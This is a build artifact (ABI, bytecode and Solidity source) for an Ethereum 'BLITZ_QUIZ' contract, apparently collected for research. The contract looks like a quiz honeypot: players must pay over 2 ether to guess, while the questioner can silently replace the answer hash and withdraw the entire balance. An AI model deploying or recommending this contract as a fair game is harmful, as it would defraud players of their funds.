{
  "contractName": "BLITZ_QUIZ",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_questionerPin",
          "type": "bytes32"
        },
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "ActivateContract",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "newQuestioner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f3f027dea301fc0510b8324b0e5ba2fd0d057f9bff0d8b678e1ee67043f1b2fb060010260039060001916905534801561003d57600080fd5b506107c98061004d6000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633853682c1461007a5780633e3ee859146100a85780633fad9ae01461011257806359988dce146101a2578063e200259e146101e5578063f50ab24714610295575b005b6100a660048036038101908080359060200190820180359060200191909192939192939050505061029f565b005b610110600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061037d565b005b34801561011e57600080fd5b506101276103fa565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561016757808201518184015260208101905061014c565b50505050905090810190601f1680156101945780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101ae57600080fd5b506101e3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610498565b005b6102936004803603810190808035600019169060200190929190803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610533565b005b61029d61063c565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102d957600080fd5b818160405180838380828437820191505092505050604051809103902060001916600254600019161480156103155750671bc16d674ec8000034115b15610379573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610377573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103f65781600090805190602001906103e99291906106f8565b5080600281600019169055505b5050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104905780601f1061046557610100808354040283529160200191610490565b820191906000526020600020905b81548152906001019060200180831161047357829003601f168201915b505050505081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156105305780600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6003546000191683604051808260001916600019168152602001915050604051809103902060001916141561063757806040518082805190602001908083835b6020831015156105985780518252602082019150602081019050602083039250610573565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206002816000191690555081600090805190602001906105e59291906106f8565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600102600381600019169055505b505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561069857600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156106f5573d6000803e3d6000fd5b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061073957805160ff1916838001178555610767565b82800160010185558215610767579182015b8281111561076657825182559160200191906001019061074b565b5b5090506107749190610778565b5090565b61079a91905b8082111561079657600081600090555060010161077e565b5090565b905600a165627a7a723058201951ebf45ffc1f63eb6c42987411704378d0d9b9e7891397c29c00bff3c2f6a60029",
  "source": "\n\ncontract BLITZ_QUIZ\n{\n\n    function Try(string _response) external payable {\n        require(msg.sender == tx.origin);\n\n        if(responseHash == keccak256(_response) && msg.value > 2 ether)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    string public question;\n\n    address questionSender;\n\n    bytes32 responseHash;\n\n    bytes32 questionerPin = 0x3f027dea301fc0510b8324b0e5ba2fd0d057f9bff0d8b678e1ee67043f1b2fb0;\n\n    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {\n        if(keccak256(_questionerPin)==questionerPin) \n        {\n            responseHash = keccak256(_response);\n            question = _question;\n            questionSender = msg.sender;\n            questionerPin = 0x0;\n        }\n    }\n\n    function StopGame() public payable {\n        require(msg.sender==questionSender);\n        msg.sender.transfer(this.balance);\n    }\n\n    function NewQuestion(string _question, bytes32 _responseHash) public payable {\n        if(msg.sender==questionSender){\n            question = _question;\n            responseHash = _responseHash;\n        }\n    }\n\n    function newQuestioner(address newAddress) public {\n        if(msg.sender==questionSender)questionSender = newAddress;\n    }\n\n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x147749ecf26c13c886a9b661f55f78e8ebd22e7a/contracts/0x147749ecf26c13c886a9b661f55f78e8ebd22e7a.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:47:54.097Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}